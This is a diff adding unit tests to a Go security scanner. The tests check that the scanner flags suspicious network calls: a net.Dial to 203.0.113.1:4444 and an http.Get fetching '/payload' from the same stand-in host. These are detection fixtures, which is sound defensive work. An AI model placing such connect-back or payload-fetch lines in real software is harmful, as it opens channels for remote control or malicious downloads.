@@ -46,6 +46,20 @@ func main() { _ = u.Pointer(nil) }`
 	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
 }
 
+func TestGoASTScanner_NetDial(t *testing.T) {
+	src := `package main
+import "net"
+func main() { net.Dial("tcp", "203.0.113.1:4444") }`
+	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Warning)
+}
+
+func TestGoASTScanner_HTTPGet(t *testing.T) {
+	src := `package main
+import "net/http"
+func main() { http.Get("http://203.0.113.1/payload") }`
+	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Warning)
+}
+
 func TestGoASTScanner_CleanFile(t *testing.T) {
 	src := `package main
 import "fmt"
